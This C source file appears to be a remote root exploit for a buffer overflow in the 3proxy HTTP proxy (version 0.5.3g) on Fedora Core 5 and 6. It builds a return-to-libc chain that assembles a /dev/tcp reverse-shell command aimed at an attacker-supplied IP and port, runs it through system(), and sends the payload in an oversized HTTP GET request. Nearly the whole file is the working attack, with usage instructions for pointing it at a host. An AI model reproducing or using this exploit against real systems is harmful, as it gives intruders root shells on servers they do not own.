
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_long ;
struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int host ;
typedef int do_ex ;


 int AF_INET ;
 int FC5_CMD_LOC ;
 int FC5_DEV_STR1 ;
 int FC5_DEV_STR2 ;
 int FC5_MOVE_ESP ;
 int FC5_NULL_STR ;
 int FC5_NUM ;
 int FC5_PORT_56789 ;
 int FC5_REDIR_1 ;
 int FC5_REDIR_2 ;
 int FC5_SH_STR ;
 int FC5_SLASH_STR ;
 int FC5_STRCPY_PLT ;
 int FC5_SYSTEM_PLT ;
 int FC5_TCP_STR1 ;
 int FC5_TCP_STR2 ;
 int FC6_CMD_LOC ;
 int FC6_DEV_STR1 ;
 int FC6_DEV_STR2 ;
 int FC6_MOVE_ESP ;
 int FC6_NULL_STR ;
 int FC6_NUM ;
 int FC6_PORT_56789 ;
 int FC6_REDIR_1 ;
 int FC6_REDIR_2 ;
 int FC6_SH_STR ;
 int FC6_SLASH_STR ;
 int FC6_STRCPY_PLT ;
 int FC6_SYSTEM_PLT ;
 int FC6_TCP_STR1 ;
 int FC6_TCP_STR2 ;
 int IP1 ;
 int IP2 ;
 int IP3 ;
 int SOCK_STREAM ;
 int __GOGOSSING (unsigned char*,int,int) ;
 int atoi (char*) ;
 int bzero (int *,int) ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int) ;
 int memset (char*,int ,int) ;
 int printf (char*,...) ;
 int send (int,unsigned char*,int,int ) ;
 int socket (int ,int ,int ) ;
 int sprintf (unsigned char*,char*,...) ;
 int sscanf (char*,char*,int*,int*,int*,int*) ;
 int strlen (unsigned char*) ;
 int strncpy (char*,char*,int) ;

int main(int argc,char *argv[]){
 u_long strcpy_plt;
 u_long move_esp;
 u_long cmd_loc;
 u_long null_str;
 u_long num;
 u_long sh_str;
 u_long redir_1;
 u_long redir_2;
 u_long slash_str;
 u_long dev_str1;
 u_long dev_str2;
 u_long tcp_str1;
 u_long tcp_str2;
 u_long port_56789;
 u_long system_plt;

 struct hostent *se;
 struct sockaddr_in saddr;
 unsigned char do_ex[4096];
 int i,l,sock;
 u_long ip,ip1,ip2,ip3,ip4;
 unsigned char attacker_ip[256];
 char host[256];
 int port=3128;

 ip=ip1=ip2=ip3=ip4;
 memset((char *)do_ex,0,sizeof(do_ex));

 printf("/*\n**\n** Fedora Core 5,6 (exec-shield) based\n"
  "** 3proxy HTTP Proxy (3proxy-0.5.3g.tgz) remote overflow root exploit\n"
  "** by Xpl017Elz\n**\n");
 if(argc<5){
  printf("** Usage: %s [host] [port] [attacker ip] [type]\n",argv[0]);
  printf("**\n** host: 3proxy HTTP Proxy server\n");
  printf("** port: default 3128\n");
  printf("** attacker ip: attacker netcat host\n");
  printf("** type: {0} - Fedora Core release 5 (Bordeaux), exec-shield default enabled.\n");
  printf("**       {1} - Fedora Core release 6 (Zod), exec-shield default enabled.\n**\n");
  printf("** Example: %s 3proxy.use_host.co.kr 3128 82.82.82.82 1\n**\n*/\n",argv[0]);
  exit(-1);
 }
 if(atoi(argv[4])){
  strcpy_plt=FC6_STRCPY_PLT;
  move_esp=FC6_MOVE_ESP;
  cmd_loc=FC6_CMD_LOC;
  null_str=FC6_NULL_STR;
  num=FC6_NUM;
  sh_str=FC6_SH_STR;
  redir_1=FC6_REDIR_1;
  redir_2=FC6_REDIR_2;
  slash_str=FC6_SLASH_STR;
  dev_str1=FC6_DEV_STR1;
  dev_str2=FC6_DEV_STR2;
  tcp_str1=FC6_TCP_STR1;
  tcp_str2=FC6_TCP_STR2;
  port_56789=FC6_PORT_56789;
  system_plt=FC6_SYSTEM_PLT;
 } else {
  strcpy_plt=FC5_STRCPY_PLT;
  move_esp=FC5_MOVE_ESP;
  cmd_loc=FC5_CMD_LOC;
  null_str=FC5_NULL_STR;
  num=FC5_NUM;
  sh_str=FC5_SH_STR;
  redir_1=FC5_REDIR_1;
  redir_2=FC5_REDIR_2;
  slash_str=FC5_SLASH_STR;
  dev_str1=FC5_DEV_STR1;
  dev_str2=FC5_DEV_STR2;
  tcp_str1=FC5_TCP_STR1;
  tcp_str2=FC5_TCP_STR2;
  port_56789=FC5_PORT_56789;
  system_plt=FC5_SYSTEM_PLT;
 }

 sscanf(argv[3],"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);



 ip=0;
 ip+=ip1 * (16777216);
 ip+=ip2 * (65536);
 ip+=ip3 * (256);
 ip+=ip4;

 memset((char *)attacker_ip,0,256);
 sprintf(attacker_ip,"%10lu",ip);

 memset((char *)host,0,sizeof(host));
 strncpy(host,argv[1],sizeof(host)-1);
 port=atoi(argv[2]);

 se=gethostbyname(host);
 if(se==((void*)0)){
  printf("** gethostbyname() error\n**\n*/\n");
  return -1;
 }
 sock=socket(AF_INET,SOCK_STREAM,0);
 if(sock==-1){
  printf("** socket() error\n**\n*/\n");
  return -1;
 }

 saddr.sin_family=AF_INET;
 saddr.sin_port=htons(port);
 saddr.sin_addr=*((struct in_addr *)se->h_addr);
 bzero(&(saddr.sin_zero),8);

 printf("** make exploit\n");
 sprintf(do_ex,"GET /");
 l=strlen(do_ex);
 for(i=0;i<1800-444;i++,l++){
  sprintf(do_ex+l,"A");
 }






 l=0;
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=0x0d0d0d0d; i+=4;};
 { *(long *)&do_ex[i]=0x0d0d0d0d; i+=4;};

 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=sh_str; i+=4;};
 l+=2;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=redir_1; i+=4;};
 l+=1;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=slash_str; i+=4;};
 l+=1;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=dev_str1; i+=4;};
 l+=2;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=dev_str2; i+=4;};
 l+=1;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=tcp_str1; i+=4;};
 l+=2;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=tcp_str2; i+=4;};
 l+=2;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=slash_str; i+=4;};
 l+=1;


 for(ip=0;ip<10;ip++){
  { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
  { *(long *)&do_ex[i]=move_esp; i+=4;};
  { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};

  switch(attacker_ip[ip]){
   case '0':
    { *(long *)&do_ex[i]=num; i+=4;};
    break;
   case '1':
    { *(long *)&do_ex[i]=num+1; i+=4;};
    break;
   case '2':
    { *(long *)&do_ex[i]=num+2; i+=4;};
    break;
   case '3':
    { *(long *)&do_ex[i]=num+3; i+=4;};
    break;
   case '4':
    { *(long *)&do_ex[i]=num+4; i+=4;};
    break;
   case '5':
    { *(long *)&do_ex[i]=num+5; i+=4;};
    break;
   case '6':
    { *(long *)&do_ex[i]=num+6; i+=4;};
    break;
   case '7':
    { *(long *)&do_ex[i]=num+7; i+=4;};
    break;
   case '8':
    { *(long *)&do_ex[i]=num+8; i+=4;};
    break;
   case '9':
    { *(long *)&do_ex[i]=num+9; i+=4;};
    break;
  }
  l+=1;
 }
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=slash_str; i+=4;};
 l+=1;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=port_56789; i+=4;};
 l+=5;
 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=redir_2; i+=4;};
 l+=1;

 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=null_str; i+=4;};

 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=null_str-40; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+3; i+=4;};


 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=null_str-40; i+=4;};
 l+=24;

 { *(long *)&do_ex[i]=strcpy_plt; i+=4;};
 { *(long *)&do_ex[i]=move_esp; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc+l; i+=4;};
 { *(long *)&do_ex[i]=null_str; i+=4;};


 { *(long *)&do_ex[i]=system_plt; i+=4;};
 { *(long *)&do_ex[i]=0x82828282; i+=4;};
 { *(long *)&do_ex[i]=cmd_loc; i+=4;};

 sprintf(do_ex+i,"\nHost: ");
 i=strlen(do_ex);
 for(l=0;l<700;l++){
  do_ex[i++]='A';
 }
 do_ex[i++]='\n';
 do_ex[i++]='\n';
 printf("** total packet size: %d\n",strlen(do_ex));

 l=connect(sock,(struct sockaddr *)&saddr,sizeof(struct sockaddr));
 if(l==-1){
  printf("** connect() error\n**\n*/\n");
  return -1;
 }
 else {
  printf("** send exploit\n");
  send(sock,do_ex,i,0);
 }
 close(sock);
 printf("** attacker host, check it up, now!\n**\n*/\n");
 exit(0);
}
